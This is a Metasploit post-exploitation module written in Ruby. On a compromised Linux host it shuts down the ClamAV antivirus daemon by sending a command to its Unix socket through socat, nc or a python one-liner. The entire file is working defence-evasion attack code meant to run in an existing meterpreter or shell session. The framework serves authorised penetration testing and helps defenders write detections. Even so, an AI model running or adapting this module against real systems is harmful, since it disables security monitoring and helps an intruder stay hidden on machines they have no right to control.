##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  Rank = ExcellentRanking
  include Msf::Post::File
  include Msf::Post::Unix

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Disable ClamAV',
        'Description' => %q{
          This module will write to the ClamAV Unix socket to shutoff ClamAV.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'DLL_Cool_J'
        ],
        'Platform' => [ 'linux' ],
        'SessionTypes' => [ 'meterpreter', 'shell' ],
        'Notes' => {
          'Stability' => [SERVICE_RESOURCE_LOSS],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )
    register_options(
      [
        OptString.new('CLAMAV_UNIX_SOCKET', [true, 'ClamAV unix socket', '/run/clamav/clamd.ctl' ]),
        OptString.new('COMMAND', [true, 'ClamAV command to execute', 'SHUTDOWN' ])
      ], self.class
    )
  end

  def run
    clamav_socket = datastore['CLAMAV_UNIX_SOCKET']
    cmd = datastore['COMMAND']

    if command_exists?('socat')
      print_good('socat exists')
      payload = "echo #{cmd} | socat - UNIX-CONNECT:#{clamav_socket}"
    elsif command_exists?('nc')
      print_good('nc exists')
      payload = "echo #{cmd} | nc -U #{clamav_socket}"
    elsif command_exists?('python')
      print_good('python exists')
      payload = "python -c \"import socket; sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); sock.connect('#{clamav_socket}'); sock.send('#{cmd}'.encode());\""
    elsif command_exists?('python3')
      print_good('python3 exists')
      payload = "python3 -c \"import socket; sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); sock.connect('#{clamav_socket}'); sock.send('#{cmd}'.encode());\""
    else
      fail_with(Failure::NotFound, 'No suitable binary found on the target host. Quitting!')
    end

    print_status("Checking file path #{clamav_socket} exists and is writable... ")
    print_bad('File does NOT exist or is not writable!') unless writable?(clamav_socket.to_s)
    print_good('File does exist and is writable!')
    print_good("Sending #{cmd}...")
    cmd_exec(payload)
  end
end
